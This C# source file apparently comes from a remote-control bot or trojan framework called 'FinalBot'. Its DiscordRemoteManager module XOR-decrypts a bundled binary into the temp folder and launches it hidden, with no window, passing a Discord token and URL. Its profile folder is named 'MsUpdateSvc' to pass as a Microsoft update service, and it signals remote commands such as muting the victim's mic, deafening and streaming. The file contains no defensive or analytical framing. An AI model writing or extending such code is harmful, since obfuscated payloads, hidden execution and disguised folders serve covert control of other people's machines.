using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace FinalBot.Modules
{
    public static class DiscordRemoteManager
    {
        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
        private static readonly string _profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MsUpdateSvc", "DiscordProfile");

        public static string LaunchDiscordBot(string token, string url, string action = "join")
        {
            try
            {
                // Control logic
                if (action == "mute_mic" || action == "deafen" || action == "deaf" || action == "stream" || action == "disconnect")
                {
                    string cmdFile = Path.Combine(Path.GetTempPath(), "discord_cmd.txt");
                    File.WriteAllText(cmdFile, action == "deaf" ? "deafen" : action);
                    return $"⚡ Command `{action}` signaled.";
                }

                if (!Directory.Exists(_tempDir)) Directory.CreateDirectory(_tempDir);
                string tempExe = Path.Combine(Path.GetTempPath(), "discord_bot_v2.exe");

                // 2. Decrypt if not already decrypted this session
                if (!File.Exists(tempExe))
                {
                    string binPath = Path.Combine(VanguardCore.Modules.ResourceModule.WorkDir, "discord_bot.bin");
                    if (!File.Exists(binPath)) return "❌ Failed: Binary 'discord_bot.bin' not found.";

                    byte[] bytes = File.ReadAllBytes(binPath);
                    for (int i = 0; i < bytes.Length; i++) bytes[i] ^= VanguardCore.Constants.RESOURCE_XOR_KEY;
                    File.WriteAllBytes(tempExe, bytes);
                }

                // Ensure profile dir exists
                if (!Directory.Exists(_profileDir)) Directory.CreateDirectory(_profileDir);

                // Launch the EXE
                Process.Start(new ProcessStartInfo
                {
                    FileName = tempExe,
                    Arguments = $"\"{token}\" \"{url}\" \"{action}\" --profile \"{_profileDir}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return $"✅ Discord Remote launched: Action `{action}` started.";
            }
            catch (Exception ex)
            {
                return $"❌ Error launching Discord bot: {ex.Message}";
            }
        }
    }
}
